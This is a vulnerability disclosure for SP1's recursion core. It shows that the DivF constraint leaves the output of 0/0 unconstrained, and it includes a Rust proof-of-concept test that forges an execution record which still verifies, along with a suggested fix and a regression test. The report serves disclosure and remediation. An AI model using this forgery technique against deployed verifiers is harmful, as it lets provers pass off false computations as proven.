# Ziren-RecursionCore-ZIR-UC-02: DivF (0/0) Output Unconstrained

## Summary
- Violated invariant: `DivF` runtime defines (0/0) = 1, but the AIR does not enforce this semantic.
- Why it works: the AIR constraint for division is only (in2 * out = in1); when (in1, in2) = (0, 0), this becomes (0 = 0) and leaves `out` unconstrained.
- Security consequence: a prover can inject an arbitrary `out` for `DivF(0,0)` in the witness/trace and still produce a verifying proof.
- Concrete demonstration: the included PoC test constructs a forged `ExecutionRecord` that verifies under the same `(pk, vk)` while keeping the same public values.

## Root Cause
- Missing implication direction / branch binding: the AIR enforces the “regular” algebraic identity (in2 * out = in1) but does not add the exceptional-case constraints that bind the runtime-defined semantics:
  - missing (in1 = 0 ∧ in2 = 0) ⇒ (out = 1)
  - missing (in1 ≠ 0 ∧ in2 = 0) ⇒ unsat (or an explicit error flag)
- Trace generation vs circuit semantics mismatch: runtime enforces domain checks and a special-case output, but trace verification does not.

## Evidence (SP1)
- `crates/recursion/core/src/runtime/mod.rs`
  ```rust
  BaseAluOpcode::DivF => match in1.try_div(in2) {
      Some(x) => x,
      None => {
          // Check for division exceptions and error. Note that 0/0 is defined
          // to be 1.
          if in1.is_zero() {
              AbstractField::one()
          } else {
              return Err(RuntimeError::DivFOutOfDomain { .. });
          }
      }
  },
  ```
  Runtime defines (0/0) = 1 and rejects (nonzero/0).

- `crates/recursion/core/src/chips/alu_base.rs`
  ```rust
  builder.when(is_div).assert_eq(in2 * out, in1);
  ```
  AIR constrains only (in2 * out = in1); for (in1, in2) = (0, 0), `out` is free.

## PoC (SP1)
- Test: `crates/recursion/core/src/machine.rs` → `div_zero_by_zero_forged_proof_keeps_public_values`
- Reproduce:
  ```bash
  cargo test -p sp1-recursion-core div_zero_by_zero_forged_proof_keeps_public_values
  ```

### PoC Code (SP1)
Permalink (GitHub): https://github.com/WindOctober/sp1/blob/c8e0ef20c/crates/recursion/core/src/machine.rs#L353

From `crates/recursion/core/src/machine.rs`:
```rust
#[test]
pub fn div_zero_by_zero_forged_proof_keeps_public_values() {
    let instructions = vec![
        // Address 0 is read twice (DivF.in2 and MulF.in2), so we give it multiplicity 2.
        instr::mem(MemAccessKind::Write, 2, 0, 0),
        instr::mem(MemAccessKind::Write, 1, 1, 0),
        instr::base_alu(BaseAluOpcode::DivF, 1, 2, 1, 0),
        instr::base_alu(BaseAluOpcode::MulF, 1, 3, 2, 0),
        instr::mem(MemAccessKind::Read, 1, 3, 0),
    ];

    let program = Arc::new(linear_program(instructions).unwrap());
    let mut runtime = Runtime::<F, EF, DiffusionMatrixBabyBear>::new(program.clone(), SC::new().perm);
    runtime.run().unwrap();

    // Runtime semantics: DivF(0,0) = 1.
    assert_eq!(runtime.record.base_alu_events[0].in1, F::zero());
    assert_eq!(runtime.record.base_alu_events[0].in2, F::zero());
    assert_eq!(runtime.record.base_alu_events[0].out, F::one());

    // Forge the record: change DivF.out to an arbitrary value, and patch MulF.in1 accordingly.
    let forged_out = F::from_canonical_u32(7);
    let mut forged_record = runtime.record;
    forged_record.base_alu_events[0].out = forged_out;
    forged_record.base_alu_events[1].in1 = forged_out;

    // Prove+verify the forged record under the same (pk, vk).
    let machine = A::machine_wide_with_all_chips(BabyBearPoseidon2::default());
    let (pk, vk) = machine.setup(&program);
    run_test_machine(vec![forged_record], machine, pk, vk).expect("Verification failed");
}
```

## Suggested Fix
- Minimal fix: add a zero-branch constraint for division that binds the exceptional semantics, e.g. introduce boolean flags (is_zero_in2, is_zero_in1) and enforce:
  - is_zero_in2 ⇒ (in2 = 0)
  - (1 - is_zero_in2) ⇒ (in2 * inv_in2 = 1) for a witnessed inverse
  - (is_zero_in2 ∧ is_zero_in1) ⇒ (out = 1)
  - (is_zero_in2 ∧ (1 - is_zero_in1)) ⇒ unsat (or a dedicated “error” flag constrained into the public statement)
  Apply the same pattern to `ExtAlu` division if applicable.

## Regression Test
- After fixing the AIR, update the PoC test to expect verification failure when `(in1, in2) = (0, 0)` but `out ≠ 1`.
